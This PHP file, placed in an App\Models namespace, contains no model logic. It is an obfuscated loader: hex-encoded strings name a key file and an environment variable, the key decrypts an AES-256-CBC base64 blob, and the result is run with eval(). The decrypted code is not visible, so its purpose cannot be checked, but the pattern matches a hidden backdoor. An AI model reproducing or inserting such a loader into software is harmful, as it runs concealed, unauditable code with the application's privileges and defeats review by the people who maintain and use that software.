<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('OZRH8xh5/ezSEvMMbI/DfA==');

$c=base64_decode(

'fVFWkzl+pRL0o/f83weeSonZg5cWiwEQjnQ4DDsuQqh+I8fIjY/200OCGZmn8cnhiCQdnZEIMGH0' .
'TArVqXGDLPlDCcJ71+kLL2fQ4jC7teXG/+NpVRSIOASG1xx9S3tvBBo7WyBeuVWgZTqLLRv4/9ON' .
'lEinEcYlERWcaory1YwZqg7TaSafG6o5wucUuoVG2JBa6pZl4JKIzFQH6w5MPyxYFlLlkW7UBAdk' .
'i1jyuiETaIv3S+64b6FjoB8DdxAf6nqDAf3NtnLhijJrVmyUDObpaAtcL7zkUKszEiFU1TsRDPVv' .
'axtdeNZGj9H4cVKapa5JQ7icFagp/2SYcxeG8rca84AOhCL1+4FcQhO5HWISB7RO+T2Sz9XTB2wN' .
'C1FJuU8If5RHW+mQGVsUJUzebL/eh9hKqJxtnvQPqXJZnXsBUjV7CLYJ0x6pT4V0G1v2ABn+Glpu' .
'qcv6WE+Ctr7PsOPDOy9V7NfCCIsua6ZvCV/jG2vq8gmbJJo7S5ECVe2HgZYI2G2b+BcBfTrxAARy' .
'y7YVF3zcMaPdij4KsstkrcgbVZrJLNVFvM7FJJKZ/56SnSJVpk8F4IIcvXW0SUU0jdVvEQFQ2eqY' .
'NdcxayKfDB3+hkHTDPL+AEXYsiFp+BnIYk/iNSRnRY3dG8/FAJ53/5lnPEUvO9IeJlIxhDBs83El' .
'4YqoGcTIytpyqA1pZObRZdTP1NKpeaJ0f9A8tyZLxyJj2v5G9A68ErcEA2Ad9KZBazotcuN/E4s2' .
'Qp8/tt5VIbl1gUI3EpKX0VLzYuhhyyi7djsVPa7bgOz+bvHdyFvTk/oBQgPZS4mgnKBQ4KIpApyP' .
'pyMbk+TLZ7iseeBAUGDQlMVHSNTtRsmyRTbLegfHZ6Wm3g/6m5rhtc3OCHrMgJ21VDgRUGJ0Bz02' .
'YaMVgg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

